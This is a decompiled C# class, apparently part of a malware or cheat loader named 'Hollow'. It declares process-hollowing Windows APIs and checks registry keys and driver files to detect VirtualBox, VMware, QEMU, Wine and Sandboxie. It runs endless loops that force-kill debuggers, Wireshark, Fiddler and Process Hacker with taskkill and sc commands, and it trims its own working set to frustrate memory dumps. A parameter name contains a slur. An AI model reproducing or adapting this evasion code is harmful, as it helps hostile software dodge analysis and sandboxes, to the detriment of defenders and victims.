using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Hollow.Tasks;
using Microsoft.Win32;

namespace Hollow.Threads
{
	// Token: 0x02000010 RID: 16
	internal class blacklisted_programs
	{
		// Token: 0x06000094 RID: 148
		[DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
		private static extern IntPtr GenericAcl(string lpModuleName);

		// Token: 0x06000095 RID: 149
		[DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
		private static extern IntPtr TryCode(IntPtr hModule, string procName);

		// Token: 0x06000096 RID: 150
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetFileAttributes", SetLastError = true)]
		private static extern uint ISymbolReader(string lpFileName);

		// Token: 0x06000097 RID: 151
		[DllImport("kernel32.dll")]
		private static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

		// Token: 0x06000098 RID: 152
		[DllImport("kernel32.dll")]
		private static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

		// Token: 0x06000099 RID: 153
		[DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
		private static extern int OneWayAttribute([In] IntPtr obj0, [In] int obj1, [In] int obj2);

		// Token: 0x0600009A RID: 154
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref blacklisted_programs.STARTUPINFO lpstartupfaggot, int[] lpProcessInfo);

		// Token: 0x0600009B RID: 155
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		// Token: 0x0600009C RID: 156
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

		// Token: 0x0600009D RID: 157
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

		// Token: 0x0600009E RID: 158
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

		// Token: 0x0600009F RID: 159
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

		// Token: 0x060000A0 RID: 160
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);

		// Token: 0x060000A1 RID: 161 RVA: 0x0000DF38 File Offset: 0x0000C138
		private static string SoapNcName([In] string obj0, [In] string obj1)
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(obj0, false);
			bool flag = registryKey == null;
			string text;
			if (flag)
			{
				text = "noKey";
			}
			else
			{
				object value = registryKey.GetValue(obj1, "noValueButYesKey");
				bool flag2 = value is string || registryKey.GetValueKind(obj1) == RegistryValueKind.String || registryKey.GetValueKind(obj1) == RegistryValueKind.ExpandString;
				if (flag2)
				{
					text = value.ToString();
				}
				else
				{
					bool flag3 = registryKey.GetValueKind(obj1) == RegistryValueKind.DWord;
					if (flag3)
					{
						text = Convert.ToString((int)value);
					}
					else
					{
						bool flag4 = registryKey.GetValueKind(obj1) == RegistryValueKind.QWord;
						if (flag4)
						{
							text = Convert.ToString((long)value);
						}
						else
						{
							bool flag5 = registryKey.GetValueKind(obj1) == RegistryValueKind.Binary;
							if (flag5)
							{
								text = Convert.ToString((byte[])value);
							}
							else
							{
								bool flag6 = registryKey.GetValueKind(obj1) == RegistryValueKind.MultiString;
								if (flag6)
								{
									text = string.Join("", (string[])value);
								}
								else
								{
									text = "noValueButYesKey";
								}
							}
						}
					}
				}
			}
			return text;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x0000E040 File Offset: 0x0000C240
		private static bool MessageDictionary()
		{
			return blacklisted_programs.SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX") || blacklisted_programs.SoapNcName("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX") || blacklisted_programs.SoapNcName("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX") || blacklisted_programs.SoapNcName("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey" || blacklisted_programs.ISymbolReader("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != uint.MaxValue || blacklisted_programs.SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") || blacklisted_programs.SoapNcName("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey" || blacklisted_programs.SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") || blacklisted_programs.SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") || blacklisted_programs.SoapNcName("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper()) || blacklisted_programs.SoapNcName("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE") || blacklisted_programs.SoapNcName("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE") || blacklisted_programs.SoapNcName("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\") || blacklisted_programs.ISymbolReader("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != uint.MaxValue || blacklisted_programs.ISymbolReader("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != uint.MaxValue || blacklisted_programs.TryCode(blacklisted_programs.GenericAcl("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0 || blacklisted_programs.SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU") || blacklisted_programs.SoapNcName("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU");
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x0000E27C File Offset: 0x0000C47C
		private static void EraseSection(IntPtr address, int size)
		{
			IntPtr intPtr = (IntPtr)size;
			blacklisted_programs.ZeroMemory(address, intPtr);
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x0000E29C File Offset: 0x0000C49C
		private static IntPtr GetModuleHandle(string libName)
		{
			foreach (object obj in Process.GetCurrentProcess().Modules)
			{
				ProcessModule processModule = (ProcessModule)obj;
				bool flag = processModule.ModuleName.ToLower().Contains(libName.ToLower());
				if (flag)
				{
					return processModule.BaseAddress;
				}
			}
			return IntPtr.Zero;
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x0000E32C File Offset: 0x0000C52C
		public static void KillBlackPrograms()
		{
			for (;;)
			{
				Run.CMD("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im Ida64.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im OllyDbg.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im Dbg64.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im beamer.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im UD.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im Dbg32.exe >nul 2>&1", false);
				Run.CMD("sc stop HTTPDebuggerPro >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1", false);
				Run.CMD("sc stop HTTPDebuggerPro >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq x64dbg*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq x32dbg*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq ollydbg*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq charles*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("sc stop HTTPDebuggerPro >nul 2>&1", false);
				Run.CMD("sc stop HTTPDebuggerProSdk >nul 2>&1", false);
				Run.CMD("sc stop KProcessHacker3 >nul 2>&1", false);
				Run.CMD("sc stop KProcessHacker2 >nul 2>&1", false);
				Run.CMD("sc stop KProcessHacker1 >nul 2>&1", false);
				Run.CMD("sc stop wireshark >nul 2>&1", false);
				Run.CMD("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1", false);
				Run.CMD("sc stop HTTPDebuggerPro >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq x64dbg*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq x32dbg*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq ollydbg*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /FI \"IMAGENAME eq die*\" /IM * /F /T >nul 2>&1", false);
				Run.CMD("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im HTTPDebugger.exe >nul 2>&1", false);
				Run.CMD("taskkill /f /im FolderChangesView.exe >nul 2>&1", false);
				Run.CMD("sc stop HttpDebuggerSdk >nul 2>&1", false);
				Run.CMD("sc stop npf >nul 2>&1", false);
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x0000E594 File Offset: 0x0000C794
		private static bool IsSandboxie()
		{
			return blacklisted_programs.GetModuleHandle("SbieDll.dll") != IntPtr.Zero;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x0000E5BC File Offset: 0x0000C7BC
		public static void MemoryDumpProtection()
		{
			IntPtr handle = Process.GetCurrentProcess().Handle;
			for (;;)
			{
				GC.Collect();
				GC.WaitForPendingFinalizers();
				bool flag = Environment.OSVersion.Platform == PlatformID.Win32NT;
				if (flag)
				{
					blacklisted_programs.OneWayAttribute(handle, -1, -1);
				}
			}
		}

		// Token: 0x0400003E RID: 62
		private static int[] sectiontabledwords = new int[] { 8, 12, 16, 20, 24, 28, 36 };

		// Token: 0x0400003F RID: 63
		private static int[] peheaderbytes = new int[] { 26, 27 };

		// Token: 0x04000040 RID: 64
		private static int[] peheaderwords = new int[]
		{
			4, 22, 24, 64, 66, 68, 70, 72, 74, 76,
			92, 94
		};

		// Token: 0x04000041 RID: 65
		private static int[] peheaderdwords = new int[]
		{
			0, 8, 12, 16, 22, 28, 32, 40, 44, 52,
			60, 76, 80, 84, 88, 96, 100, 104, 108, 112,
			116, 260, 264, 268, 272, 276, 284
		};

		// Token: 0x02000011 RID: 17
		private struct STARTUPINFO
		{
			// Token: 0x04000042 RID: 66
			public uint cb;

			// Token: 0x04000043 RID: 67
			public string lpReserved;

			// Token: 0x04000044 RID: 68
			public string lpDesktop;

			// Token: 0x04000045 RID: 69
			public string lpTitle;

			// Token: 0x04000046 RID: 70
			public uint dwX;

			// Token: 0x04000047 RID: 71
			public uint dwY;

			// Token: 0x04000048 RID: 72
			public uint dwXSize;

			// Token: 0x04000049 RID: 73
			public uint dwYSize;

			// Token: 0x0400004A RID: 74
			public uint dwXCountChars;

			// Token: 0x0400004B RID: 75
			public uint dwYCountChars;

			// Token: 0x0400004C RID: 76
			public uint dwFillAttribute;

			// Token: 0x0400004D RID: 77
			public uint dwFlags;

			// Token: 0x0400004E RID: 78
			public short wShowWindow;

			// Token: 0x0400004F RID: 79
			public short cbReserved2;

			// Token: 0x04000050 RID: 80
			public IntPtr lpReserved2;

			// Token: 0x04000051 RID: 81
			public IntPtr hStdInput;

			// Token: 0x04000052 RID: 82
			public IntPtr hStdOutput;

			// Token: 0x04000053 RID: 83
			public IntPtr hStdError;
		}
	}
}
